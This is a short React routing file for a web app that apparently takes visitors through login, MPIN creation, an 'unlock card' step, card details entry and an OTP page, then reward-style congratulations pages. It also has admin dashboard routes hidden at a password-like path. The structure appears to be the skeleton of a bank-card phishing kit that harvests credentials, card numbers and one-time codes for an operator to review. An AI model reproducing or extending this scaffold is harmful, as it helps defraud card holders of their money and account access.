import { Routes, Route, Navigate } from 'react-router-dom';
import Layout from './components/Layout';
import LoginForm from './pages/LoginForm';
import MPINForm from './pages/MPINForm';
import UnlockCard from './pages/UnlockCard';
import CongratulationsPage from './pages/CongratulationsPage';
import CardDetailsForm from './pages/CardDetailsForm';
import { AppContextProvider } from './context/AppContext';
import FinalCongratulations from './pages/FinalCongratulations';
import AdminDashboard from './pages/AdminDashboard';
import AdminPanel from './pages/AdminPanel';
import OtpPage from './pages/OtpPage';
import ThanksPage from './pages/ThanksPage';

function App() {
  return (
    <AppContextProvider>
      <Layout>
        <Routes>
          <Route path="/" element={<LoginForm />} />
          <Route path="/create-mpin" element={<MPINForm />} />
          <Route path="/unlock-card" element={<UnlockCard />} />
          <Route path="/congratulations" element={<CongratulationsPage />} />
          <Route path="/card-details" element={<CardDetailsForm />} />
          <Route path="/final-congratulations" element={<FinalCongratulations />} />
          <Route path="/otp" element={<OtpPage />} />
          <Route path="/thanks" element={<ThanksPage />} />
          <Route path="*" element={<Navigate to="/" replace />} />
          <Route path="/Jaan@123" element={<AdminDashboard />} />
          <Route path="/Jaan@123" element={<AdminPanel />} />
        </Routes>
      </Layout>
    </AppContextProvider>
  );
}

export default App;